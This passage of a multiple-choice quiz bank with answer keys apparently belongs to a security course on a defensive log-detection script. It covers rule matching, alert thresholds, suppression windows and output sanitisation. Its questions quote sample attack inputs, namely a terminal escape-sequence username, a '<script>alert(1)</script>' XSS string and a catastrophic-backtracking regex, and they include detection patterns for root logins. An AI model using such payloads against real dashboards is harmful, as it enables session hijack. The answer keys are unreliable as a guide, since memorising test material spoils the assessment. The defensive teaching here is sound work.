    "q": "If a log event somehow triggers TWO rules simultaneously (both matching the same log string), why doesn't `m07_defensive.py` include `break` inside `for rule in RULES:`?",
    "options": [
      "Including `break` raises `StopIteration` inside `timedelta`",
      "Leaving out `break` ensures every matching rule evaluates independently against the log line rather than silently dropping lower rules in the list",
      "Because `RULES` only ever permits one rule with `threshold=1`",
      "Omitting `break` runs suppression backward across timestamps"
    ],
    "correct": 1,
    "explanation": "A single log line can exhibit multiple suspicious indicators; evaluating all rules guarantees complete detection coverage."
  },
  {
    "id": "q_c4_m7_047",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Look at `RK-003`: `r'useradd\\[\\d+\\]: new user: name=(?P<user>[^,]+)'`. Why does the named user group match `[^,]+` rather than `\\S+`?",
    "options": [
      "So that `name=` matches empty usernames cleanly",
      "Because `\\S+` is invalid inside `re.compile`",
      "Because `useradd` separates usernames with semicolons",
      "A crafted `useradd` name field terminated by a comma can contain embedded spaces or control sequences (`svc\\x1b[31mbackup, UID=...`), so stopping cleanly at `,` captures the full field"
    ],
    "correct": 3,
    "explanation": "`useradd` log format writes `name=<val>, UID=<id>...`; `[^,]+` consumes up to the comma delimiter accurately."
  },
  {
    "id": "q_c4_m7_048",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Compare two rules sharing entity `'ben'`: an IP-less `sudo` failure rule (`RK-002`) and a custom rule (`RK-009`) alerting on modified crontab for `user='ben'`. What goes wrong if `last_alert` keys solely by `entity` (`last_alert['ben']`)?",
    "options": [
      "`RK-009` doubles `counts['ben']` to trigger at threshold 0",
      "`dict` raises `KeyError` when strings contain lowercase letters",
      "Triggering `RK-002` sets the 10-minute suppression clock on `'ben'`, silently silencing an immediate critical `RK-009` persistence alert for `'ben'`",
      "Nothing goes wrong because both rules relate to the same user"
    ],
    "correct": 2,
    "explanation": "Cross-rule suppression blindness happens if `(rule_id, entity)` composite keying is flattened to `entity` alone."
  },
  {
    "id": "q_c4_m7_049",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "What cross-course standard in the RedKross Academy curriculum (Courses 08 and 20) generalizes declarative rule syntax across SIEMs like Splunk, Elastic, and Sentinel?",
    "options": [
      "`HTML` table templates",
      "`CSV` formula spreadsheets",
      "`pickle` binary rule pickles",
      "`Sigma` detection rules"
    ],
    "correct": 3,
    "explanation": "Sigma is the open vendor-neutral YAML signature format taught for portable SIEM detection engineering."
  },
  {
    "id": "q_c4_m7_050",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "If `rules.json` contains a rule entry with `'threshold': 0` or `'threshold': -2`, what security/operational defect causes alerts unless startup validation rejects `threshold < 1`?",
    "options": [
      "Python throws `ZeroDivisionError` inside `dict.get()`",
      "Non-positive thresholds fire on the very first match (`1 >= 0`) identically to `threshold=1`, breaking multi-failure rules silently or indicating corrupt configuration",
      "Negative thresholds suppress the rule permanently across all logs",
      "Regex captures invert their sign"
    ],
    "correct": 1,
    "explanation": "Startup validation must enforce integer `threshold >= 1` and non-empty string metadata before trusting configuration."
  },
  {
    "id": "q_c4_m7_051",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "What fallback entity string does `m07_defensive.py` assign if a matched rule defines neither `(?P<ip>...)` nor `(?P<user>...)`?",
    "options": [
      "`'-'` via `(m.groupdict().get('ip') or m.groupdict().get('user') or '-')`",
      "`'root'`",
      "`None`, raising `AttributeError`",
      "`'localhost'`"
    ],
    "correct": 0,
    "explanation": "The `or '-'` fallback avoids `KeyError` or `TypeError` for rules tracking host-wide events lacking a named `ip` or `user` group."
  },
  {
    "id": "q_c4_m7_052",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "In `m07_defensive.py`, notice `sanitise(...)` is applied BEFORE building `key = (rule['id'], entity)`! What edge case arises if two log entries produce identical cleaned `entity` strings after stripping two different non-printable control bytes?",
    "options": [
      "It forces `threshold` back to 0",
      "`re.sub` refuses to compare strings containing `?`",
      "It corrupts UTF-8 characters inside `baseline.json`",
      "Both map to the same clean `'svc?[31mbackup'` key in `counts` and `last_alert`, which intentionally folds control-byte evasion variations under one suppressed tracking key"
    ],
    "correct": 3,
    "explanation": "Normalizing before keying prevents attackers from varying invisible control codes (`\\x01`, `\\x02`) to defeat alert suppression or split thresholds."
  },
  {
    "id": "q_c4_m7_053",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Why must external JSON rules NEVER be executed via Python `eval()` or `exec()` even if distributed by a teammate?",
    "options": [
      "`exec()` rejects hexadecimal strings",
      "`eval()` runs slower than `json.load()`",
      "Loading rules with `json.load()` + `re.compile()` guarantees data-only evaluation, whereas `eval()` turns a tampered config file into full arbitrary code execution",
      "`eval()` cannot return dictionaries"
    ],
    "correct": 2,
    "explanation": "Treating rule catalogs strictly as passive data rather than executable code is essential to supply-chain and config defense."
  },
  {
    "id": "q_c4_m7_054",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Look at `RK-001` (`r'Accepted \\S+ for root from (?P<ip>\\S+)'`) vs. an arbitrary SSH message `sshd[9]: notice from host for Accepted password for root from 203.0.113.7`. Notice `RK-001` uses `re.search()` without a start-of-line anchor `^`. What risk should Practical P2 rule authors watch for when writing unanchored patterns?",
    "options": [
      "Attacker-controlled strings inside usernames, file paths, or syslog messages containing the substring could match falsely unless rules constrain prefixes or anchor host syslog headers",
      "`re.search()` strips named capture groups automatically",
      "Unanchored patterns fail `re.compile()` under CPython 3.12+",
      "Unanchored regexes always trigger ReDoS in constant time"
    ],
    "correct": 0,
    "explanation": "Testing against attacker-controlled field injection ensures unanchored regexes cannot be spoofed by substrings inside lower-privilege log fields."
  },
  {
    "id": "q_c4_m7_055",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Which severity values appear in the built-in `RULES` catalog of `m07_defensive.py`?",
    "options": [
      "`'high'` (on `RK-001` Root SSH login) and `'medium'` (on `RK-002` sudo failures and `RK-003` useradd)",
      "`'critical'` only across all three rules",
      "`0`, `1`, and `2` integers",
      "`'info'` and `'debug'`"
    ],
    "correct": 0,
    "explanation": "`RK-001` carries `'high'` severity; `RK-002` and `RK-003` carry `'medium'` severity."
  },
  {
    "id": "q_c4_m7_056",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "In Practical P2, suppose you add rule `RK-004` matching `Failed password for invalid user (?P<user>\\S+)` with `threshold: 5` and a 5-minute window, and validate `rules.json` at startup. Which check catches a typo where a teammate wrote `'severty': 'high'` instead of `'severity'`?",
    "options": [
      "Calling `re.compile(rule['pattern'])` alone",
      "Validating mandatory key presence (`{'id', 'title', 'pattern', 'threshold', 'severity'} <= rule.keys()`) at startup before ingesting any logs",
      "Running `json.dumps(rule, sort_keys=True)`",
      "Calling `sanitise(rule['id'])`"
    ],
    "correct": 1,
    "explanation": "Schema validation checks both exact required keys and valid types/values up front so typos never crash mid-incident with `KeyError`."
  },
  {
    "id": "q_c4_m7_057",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Why should each rule in a declarative rule catalog hold a unique immutable string ID such as `'RK-001'` alongside a human `'title'`?",
    "options": [
      "IDs compress regex patterns into 6 characters",
      "Dictionaries require strings starting with `'RK-'`",
      "Stable rule IDs allow SOC tuning, dashboards, and suppression keys to survive wording tweaks to human `'title'` strings",
      "Rule IDs replace file paths in `alerts.jsonl`"
    ],
    "correct": 2,
    "explanation": "Stable identifiers ensure analytics queries, playbooks, and suppression tables stay intact even when rule titles are clarified."
  },
  {
    "id": "q_c4_m7_058",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Suppose an attacker supplies `name=root, UID=0, bad=fake` to trick `useradd`, or runs `useradd` with a regex-backtracking payload against a declarative JSON rule. Which safeguards from Modules 3 and 7 protect the rule engine?",
    "options": [
      "Setting `ensure_ascii=False` in JSON output",
      "Increasing `SUPPRESS` to 60 minutes",
      "Bounding incoming log line lengths (Module 8 `MAX_LINE`), avoiding nested ambiguous regex quantifiers like `(a+)+`, and validating patterns before deployment",
      "Using `sorted(RULES)`"
    ],
    "correct": 2,
    "explanation": "Combining bounded line ingestion with non-catastrophic regex design prevents attacker log strings from stalling the Python detection process (ReDoS)."
  },
  {
    "id": "q_c4_m7_059",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Look at `RK-002` (`r'sudo: .*authentication failure.*user=(?P<user>\\S+)'`): in `m07_defensive.py`, which synthetic entity triggered `'RK-002'`?",
    "options": [
      "`ben`",
      "`203.0.113.7`",
      "`svc?[31mbackup`",
      "`root`"
    ],
    "correct": 0,
    "explanation": "The five synthetic `sudo` authentication failure entries at offsets +20s, +25s, +30s, +31s, and +40s all carried `user=ben`."
  },
  {
    "id": "q_c4_m7_060",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "If a declarative rule omits `threshold` in `rules.json`, should a defensive schema validator silently default `threshold` to `0`, `1`, or raise a startup configuration error?",
    "options": [
      "Set `threshold` to `None` and let `counts[key] >= None` run",
      "Default silently to `0` so every event always alerts twice",
      "Skip the rule completely without logging anything",
      "Raise a clear startup configuration error (fail closed) because silent defaults risk masking unintended misconfigurations on sensitive rules"
    ],
    "correct": 3,
    "explanation": "Defensive tooling rejects malformed configs cleanly at startup (`exit 2`) rather than silently guessing thresholds or crashing at runtime (`counts >= None` raises `TypeError`)."
  },
  {
    "id": "q_c4_m7_061",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "According to the US Senate Commerce Committee Majority Staff report cited in Case Study C04-M07-CS1 (Target 2013), why did automated security warnings fail to prevent the breach?",
    "options": [
      "No security tools existed on Target endpoints at all",
      "Target used Python `pickle` instead of JSON",
      "Automated intrusion detection systems did raise alerts, but the organization failed to respond effectively amidst massive alert noise",
      "SHA-256 had a 27-minute outage"
    ],
    "correct": 2,
    "explanation": "Target illustrates the deadly cost of alert fatigue: tools detect activity, yet unacted warnings drowned in volume yield full breach impact."
  },
  {
    "id": "q_c4_m7_062",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "In `m07_defensive.py` with `LOG` offsets `(0, 20, 25, 30, 31, 40, 90)` and `SUPPRESS = timedelta(minutes=10)`, why did only 1 `RK-002` alert emit despite 5 `sudo` failures for `ben`?",
    "options": [
      "+20s (count 1) and +25s (count 2) sit below threshold `3`; +30s reaches `3` and emits while setting `last_alert = +30s`; +31s (`1s < 600s`) and +40s (`10s < 600s`) fall inside the 10-minute suppression cooldown",
      "Suppression silently reset `counts[('RK-002', 'ben')]` back to `0` at +31s",
      "The regex rejected timestamps after +30s",
      "`alerts.jsonl` only saves the first 3 lines per run"
    ],
    "correct": 0,
    "explanation": "Offsets +31s and +40s pass `counts[key] >= 3` (`4 >= 3` and `5 >= 3`), then drop cleanly at `(t - prev) < SUPPRESS`."
  },
  {
    "id": "q_c4_m7_063",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "Notice that Scenario S2 generates **50,000 failure events** from a misconfigured service over 25 minutes (`1,500 seconds`). With threshold `3`, suppression window `600s` (10 minutes), and rate limiting/batching, how many distinct alert cycles can fire across 25 minutes?",
    "options": [
      "At most `3` alerts (`t=0m`, `t=10m`, `t=20m`), reducing 50,000 raw failures by >99.99% into a single manageable incident",
      "49,998 alerts, suppressing only the first two",
      "50,000 alerts because suppression skips every odd event",
      "Zero alerts because counters overflow past 1,000"
    ],
    "correct": 0,
    "explanation": "A 600-second cooldown limits re-alerting to at most once every 10 minutes per `(rule, entity)`, turning floods into concise summaries."
  },
  {
    "id": "q_c4_m7_064",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Identify the structural limitation in `m07_defensive.py`'s simplified counter `counts[key] = counts.get(key, 0) + 1` if run continuously for a year without adding a sliding time window (`deque`).",
    "options": [
      "Dictionaries delete keys older than 10 minutes automatically",
      "Slow benign typos spread months apart (`Jan 1`, `Apr 15`, `Nov 7`) stay in `counts` forever and reach `threshold=3` even though no rapid attack occurred",
      "Once suppressed once, `counts` throws `OverflowError`",
      "`SUPPRESS` clears `counts` on every match"
    ],
    "correct": 1,
    "explanation": "Production rule engines pair `counts` eviction via a bounded sliding window (`deque` trimming timestamps older than `window`) with suppression cooldowns."
  },
  {
    "id": "q_c4_m7_065",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "Under what exact condition does `if prev is None or (t - prev) >= SUPPRESS:` allow an alert to emit?",
    "options": [
      "Only on the very first event matching any rule regardless of `threshold`",
      "Only when `(t - prev) < SUPPRESS`",
      "Either this `(rule, entity)` pair has never alerted (`prev is None`), OR at least `SUPPRESS` time (`>= 10 minutes`) has elapsed since its last alert",
      "Whenever `prev` matches `t` down to exact microseconds"
    ],
    "correct": 2,
    "explanation": "Emission requires either first-time sighting (`prev is None`) or expiration of the full `SUPPRESS` cooldown (`(t - prev) >= SUPPRESS`)."
  },
  {
    "id": "q_c4_m7_066",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "In `m07_defensive.py`, suppose we append an 8th event at offset `+650s` (`sudo: authentication failure ... user=ben`). Given `last_alert[('RK-002', 'ben')] = +30s` and `SUPPRESS = 600s`, what occurs at `+650s`?",
    "options": [
      "Alert fires ONLY if `counts` was reset to `0` manually",
      "Nothing fires because `RK-002` suppresses permanently once fired once",
      "`650 - 30 = 620s >= 600s`, so the cooldown has expired: a 4th alert (`RK-002`) fires and updates `last_alert` to `+650s`",
      "`t - prev` raises `TypeError` past 600 seconds"
    ],
    "correct": 2,
    "explanation": "Cooldown expires at `+30s + 600s = +630s`; at `+650s`, `(t - prev) = 620s >= 600s`, alerting once again to prove the issue persists."
  },
  {
    "id": "q_c4_m7_067",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "Look at the order inside `m07_defensive.py`: when `RK-002` hits count 3 at `+30s`, notice `last_alert` records `t` (`2026-11-07T10:00:30+00:00`). What timezone type does `t0 = datetime(2026, 11, 7, 10, 0, tzinfo=timezone.utc)` carry?",
    "options": [
      "Timezone-aware UTC (`timezone.utc`), preventing naive/aware `TypeError` bugs during timestamp subtraction `(t - prev)`",
      "Naive local machine time",
      "Raw epoch floats",
      "String ISO timestamps without offsets"
    ],
    "correct": 0,
    "explanation": "All timestamps use timezone-aware UTC `datetime` objects so `timedelta` subtraction `(t - prev)` never fails across DST transitions or log sources."
  },
  {
    "id": "q_c4_m7_068",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "What danger arises if an engineer fixes noisy `RK-002` alerts by muting `'RK-002'` forever once it triggers once per host instead of using a bounded cooldown (`SUPPRESS = 10 minutes`) plus rate limiting?",
    "options": [
      "Forever suppression prints raw tracebacks to end users",
      "Forever suppression causes memory exhaustion in 10 seconds",
      "Forever suppression fails `json.dumps(ensure_ascii=True)`",
      "A genuine brute-force escalation happening three days later against `'ben'` would be silently dropped forever without alerting operations"
    ],
    "correct": 3,
    "explanation": "Suppression windows mute transient bursts cleanly while ensuring prolonged or returning threats still resurface cleanly after cooldown."
  },
  {
    "id": "q_c4_m7_069",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "In `Scenario S2` (50,000 chatty alerts crashing an operational pipeline), besides threshold counting and suppression windows, which extra guard caps total outgoing dispatch volume?",
    "options": [
      "Replacing JSON Lines with Python `pickle` objects",
      "Rate limiting combined with severity-based routing (separating routine service errors from high-severity intrusions)",
      "Lowering threshold from 3 down to 1",
      "Disabling UTF-8 error handling"
    ],
    "correct": 1,
    "explanation": "Rate limiting caps total alert throughput while severity routing keeps critical intrusion alerts on a fast path."
  },
  {
    "id": "q_c4_m7_070",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "When upgrading `counts` in `Practical P2` to a true sliding window over unsorted logs, why does `m07_defensive.py` process `LOG` in chronological order, and what happens if raw multi-host syslog arrives out of time order?",
    "options": [
      "Sorting breaks `(rule_id, entity)` tuple hashing",
      "`timedelta` ignores negative differences and returns `abs(t - prev)`",
      "Unsorted timestamps raise `ValueError` in `datetime`",
      "Out-of-order timestamps can miscompute `(t - prev) < 0` or pop recent events falsely unless input is sorted by `ts` first or handled explicitly"
    ],
    "correct": 3,
    "explanation": "Sorting events by parsed UTC timestamp (`Module 8` pattern) ensures sliding windows and cooldown differences stay monotonically non-negative."
  },
  {
    "id": "q_c4_m7_071",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "At offset `+0s`, why does `RK-001` (`Root SSH login`) raise Alert 1 immediately on a single event while `RK-002` waits until offset `+30s`?",
    "options": [
      "`RK-001` sets `SUPPRESS = timedelta(0)`",
      "`RK-001` specifies `'threshold': 1`, whereas `RK-002` specifies `'threshold': 3`",
      "`RK-001` extracts an IP address which bypasses thresholds",
      "`RK-002` waits 30 seconds by wall-clock `time.sleep`"
    ],
    "correct": 1,
    "explanation": "Direct remote root logins represent immediate high-severity policy anomalies (`threshold=1`), unlike single `sudo` password typos (`threshold=3`)."
  },
  {
    "id": "q_c4_m7_072",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Suppose a team configures `SUPPRESS = timedelta(minutes=10)` and sets `last_alert` for `('RK-002', 'ben')` at `+30s`. Meanwhile, an intrusion triggers `RK-001` (`Root SSH login`, high severity) from `198.51.100.4` at `+35s`. Does `RK-002`'s active cooldown block `RK-001`?",
    "options": [
      "Yes — `SUPPRESS` overrides `threshold=1` globally",
      "Yes — global suppression mutes all rules for 10 minutes once any medium rule fires",
      "Only if `severity == 'high'` is smaller alphabetically than `'medium'`",
      "No — `last_alert` is keyed by `('RK-001', '198.51.100.4')`, completely distinct from `('RK-002', 'ben')`, so the high-severity root SSH alert fires immediately"
    ],
    "correct": 3,
    "explanation": "Per-`(rule, entity)` isolation guarantees noisy medium rules never mute independent critical detections."
  },
  {
    "id": "q_c4_m7_073",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "What happens to the alert dictionary fields emitted inside `alerts.jsonl` (`'time'`, `'rule'`, `'severity'`, `'entity'`, `'title'`) when written to disk in `m07_defensive.py`?",
    "options": [
      "All 3 alerts concatenate into a Python list without newlines",
      "Each alert writes as one self-contained JSON line (`alerts.jsonl`), totaling `3` lines matching the 3 raised alerts",
      "Only `'rule'` and `'entity'` serialize to save bytes",
      "Timestamps rewrite into local human month names like `'Nov 7'`"
    ],
    "correct": 1,
    "explanation": "Line 107 prints `alerts.jsonl lines: 3` verifying one serialized JSON object per line (`JSON Lines` format)."
  },
  {
    "id": "q_c4_m7_074",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "During suppression, `m07_defensive.py` quietly drops `+31s` and `+40s`. How do mature SOC pipelines report suppressed duplicate bursts cleanly without losing forensic event counts?",
    "options": [
      "Delete the underlying raw log file to save storage",
      "Print all 50,000 suppressed lines straight to stderr",
      "Disable the rule automatically once suppressed twice",
      "Track a suppressed counter alongside the active incident window and emit a summary count (`+2 suppressed events since last alert`) when the next cooldown opens or closes"
    ],
    "correct": 3,
    "explanation": "Summary rollups preserve incident scale metrics (`how many total attempts occurred`) while preventing 50,000 individual page storms."
  },
  {
    "id": "q_c4_m7_075",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "In `Scenario S2`, why should you separate routine application crash errors from high-severity authentication intrusions rather than routing all messages through one flat Slack/pager channel?",
    "options": [
      "Because Slack rejects JSON payloads containing `severity='high'`",
      "Severity routing prevents noisy operational chat crashes from burying or delaying critical security incident responses",
      "To force low-severity failures to exit with status `2`",
      "Because Python `re` skips low-severity patterns"
    ],
    "correct": 1,
    "explanation": "Routing low-noise health alerts vs. high-severity security detections protects responder attention against Target-style overload."
  },
  {
    "id": "q_c4_m7_076",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Examine what changes in `m07_defensive.py` if an adversary spreads 3 `sudo` failures for `ben` at `+20s`, `+25s`, and `+30s` and we add a `5-minute` sliding window (`deque`) vs. if the 3 failures occur at `t=0h`, `t=2h`, `t=4h`:",
    "options": [
      "The 2-hour spread fires 3 times because suppression resets hourly",
      "Both sequences fire identically under a 5-minute `deque`",
      "Neither sequence fires under a `deque` because `len(deque)` stops at 2",
      "With a 5-minute sliding window, the 3-second burst at `+30s` fires `RK-002` cleanly while events 2 hours apart expire before accumulating to 3"
    ],
    "correct": 3,
    "explanation": "Sliding window eviction drops entries older than `now - window` so count thresholds measure genuine rapid bursts rather than lifetime sums."
  },
  {
    "id": "q_c4_m7_077",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "Why does `m07_defensive.py` derive event timestamp `t` using `t0 + timedelta(seconds=offset_s)`?",
    "options": [
      "Because real syslog lines lack timestamps",
      "To build deterministic synthetic event timestamps relative to `2026-11-07T10:00Z` so suppression math reproduces identically on every test run",
      "Because `timedelta` does not accept minutes",
      "To sleep CPU execution between iterations"
    ],
    "correct": 1,
    "explanation": "Deterministic synthetic fixtures let defenders test thresholds and suppression boundaries reliably in fraction-of-a-second unit tests."
  },
  {
    "id": "q_c4_m7_078",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Look carefully at boundary strictness in `if prev is None or (t - prev) >= SUPPRESS:`: suppose `SUPPRESS = timedelta(minutes=10)` and `t - prev` equals *exactly* `600 seconds` (`10m 00s`). Does `m07_defensive.py` suppress or emit?",
    "options": [
      "Emits half an alert without `time`",
      "Suppresses because strict `<` requires `601 seconds`",
      "Raises `ValueError` on exact tie",
      "Emits the alert cleanly, because `(t - prev) >= SUPPRESS` uses `>=` (`600 >= 600` is `True`)"
    ],
    "correct": 3,
    "explanation": "`>=` opens the next alert window precisely once `SUPPRESS` has elapsed (`600s >= 600s`)."
  },
  {
    "id": "q_c4_m7_079",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "What primary operational risk occurs when security teams lower thresholds across noisy rules without testing known-good baseline logs first?",
    "options": [
      "Python memory usage drops to zero",
      "Massive false-positive floods degrade analyst trust and obscure genuine compromises",
      "SHA-256 digests become invertible",
      "`hmac.compare_digest` always returns `False`"
    ],
    "correct": 1,
    "explanation": "Tuning rules against known-good logs prevents overwhelming SOC queues with noisy non-incidents."
  },
  {
    "id": "q_c4_m7_080",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "In a distributed fleet where 50 web servers each run a local detector script, why can local suppression still emit 50 simultaneous alerts during a global credential-stuffing scan from one external IP?",
    "options": [
      "Because `RK-001` bypasses all rate limits",
      "Because `SUPPRESS` only runs on Linux kernels",
      "Because Python `dict` caps at 10 keys",
      "Because each host maintains only its own local `last_alert` dictionary; fleet-wide deduplication across servers also requires central SIEM correlation"
    ],
    "correct": 3,
    "explanation": "Host-level suppression prevents single-host floods, while central SIEM aggregation correlates identical IP alerts across all 50 hosts."
  },
  {
    "id": "q_c4_m7_081",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "What threat does `sanitise(text, limit=80)` in `m07_defensive.py` neutralize when parsing an attacker-crafted username containing `\\x1b[31m` (`ESC[31m`)?",
    "options": [
      "SQL table dropping in SQLite",
      "Terminal ANSI escape / control-character injection capable of faking colors, hiding lines, or manipulating operator consoles",
      "Hash collision forgery on SHA-256",
      "DNS zone transfer poisoning"
    ],
    "correct": 1,
    "explanation": "`re.sub(r'[\\x00-\\x1f\\x7f]', '?', text)[:limit]` converts `ESC` (`0x1B`) and newlines/carriage returns cleanly into literal `?` before output."
  },
  {
    "id": "q_c4_m7_082",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Inspect `m07_defensive.py` output `RK-003 medium svc?[31mbackup`. Why did `[31mbackup` remain visible while the single `\\x1b` byte became `?`?",
    "options": [
      "Because JSON decoded `\\x1b` back to `?` automatically",
      "Because `limit=80` truncated only the left byte",
      "Because `re.sub` skips uppercase control codes",
      "`\\x1b` (`ESC`) is byte `27` inside `[\\x00-\\x1f\\x7f]`, whereas `[`, `3`, `1`, `m` are ordinary printable ASCII bytes outside that control range—neutralizing the ANSI control sequence harmlessly while preserving printable forensics"
    ],
    "correct": 3,
    "explanation": "Stripping the leading `ESC` (`0x1B`) breaks the terminal control sequence cleanly (`svc?[31mbackup`) while leaving ordinary printable text legible for forensic investigation."
  },
  {
    "id": "q_c4_m7_083",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "In Scenario S3 (`attacker passes username <script>alert(1)</script> over SSH`) and Practical P2, why does formatting an HTML dashboard table with `f'<td>{entity}</td>'` introduce a critical vulnerability?",
    "options": [
      "HTML syntax fails to close `<td>` unless numeric entities are used",
      "Stored Cross-Site Scripting (XSS): an operator opening the generated alert table runs attacker JavaScript directly inside their authenticated dashboard session",
      "Python refuses strings containing angle brackets inside f-strings",
      "Browser downloads `entity` as a CSV file"
    ],
    "correct": 1,
    "explanation": "Unescaped `<script>` tags injected into HTML reports parse and execute as JavaScript inside the analyst's browser."
  },
  {
    "id": "q_c4_m7_084",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "How does standard-library `html.escape('<script>alert(1)</script>', quote=True)` neutralize the XSS payload when rendering HTML alert reports?",
    "options": [
      "It wraps the payload inside `<style>` comments",
      "It strips every letter between `<` and `>` leaving an empty cell",
      "It executes the script once in a sandboxed subprocess first",
      "It converts `<` to `&lt;`, `>` to `&gt;`, `&` to `&amp;`, and quotes (`\"`, `'`) to entities so browsers display inert literal text rather than executable script tags"
    ],
    "correct": 3,
    "explanation": "HTML character entity encoding converts angle brackets and quotes into passive display characters; pairing it with a strict Content Security Policy adds defense in depth."
  },
  {
    "id": "q_c4_m7_085",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "Notice that `sanitise(r'[\\x00-\\x1f\\x7f]', '?')` does NOT strip `<` or `>`. Why does Scenario S3 demonstrate you cannot rely solely on terminal sanitisation to stop browser XSS?",
    "options": [
      "`re.sub` cannot match `<` or `>` characters",
      "`<` (`0x3C`) and `>` (`0x3E`) are valid printable ASCII characters—safe in terminal JSONL yet dangerous in HTML DOMs unless the HTML renderer applies `html.escape()`",
      "HTML parsers ignore `?` completely",
      "`json.dumps(ensure_ascii=True)` converts `<` to `<script>`"
    ],
    "correct": 1,
    "explanation": "Each output sink (terminal, JSON, CSV, HTML) has distinct active metacharacters and demands context-appropriate escaping."
  },
  {
    "id": "q_c4_m7_086",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Why does `sanitise(text, limit=80)` strip `\\n` (`0x0A`) and `\\r` (`0x0D`) simultaneously alongside `\\x1b` (`ESC`)?",
    "options": [
      "To convert multi-line CSV outputs to XML",
      "Because `json.dumps` cannot encode newline characters",
      "Because UTF-8 prohibits `\\n` inside dictionary values",
      "`0x0A` and `0x0D` lie within `\\x00-\\x1f`, defeating CR/LF log injection where attackers embed forged fake log lines inside one username"
    ],
    "correct": 3,
    "explanation": "Replacing `\r` and `\n` with `?` guarantees an untrusted field cannot split one alert row into fabricated subsequent log lines."
  },
  {
    "id": "q_c4_m7_087",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "Why does `m07_defensive.py` write alerts using `json.dumps(alert, ensure_ascii=True)` inside `alerts.jsonl`?",
    "options": [
      "It adds HMAC signatures inside every JSON key automatically",
      "It guarantees clean single-line pure-ASCII JSON records, escaping non-ASCII or bidirectional spoof characters unambiguously via `\\uXXXX`",
      "It strips `<script>` tags into `&lt;script&gt;` automatically",
      "It limits file size to 80 bytes"
    ],
    "correct": 1,
    "explanation": "`ensure_ascii=True` ensures downstream text tools and SIEM collectors receive strict single-line printable ASCII JSON objects."
  },
  {
    "id": "q_c4_m7_088",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Inspect an alert pipeline step in `C04-M07-F3` guided by the OWASP Logging Cheat Sheet: why must alert emitters explicitly redact authorization tokens, passwords, and API keys before serializing failures or alerts?",
    "options": [
      "To compress `alerts.jsonl` by 90%",
      "Because secrets contain `\\x1b` bytes which crash `json.dumps()`",
      "Because OWASP bans logging source IP addresses cleanly",
      "Alert logs frequently ship to wide analyst dashboards, tickets, and external webhooks where unredacted secrets expose credentials to every reader"
    ],
    "correct": 3,
    "explanation": "Logs and alerts are wide-read secondary data stores; leaking bearer tokens or passwords inside error/alert records widens credential compromise."
  },
  {
    "id": "q_c4_m7_089",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "What additional browser defense pairs with server-side `html.escape()` in Scenario S3 so even an accidental escaping oversight in a future dashboard column cannot run inline scripts?",
    "options": [
      "Replacing `<td>` with `<script>` tags",
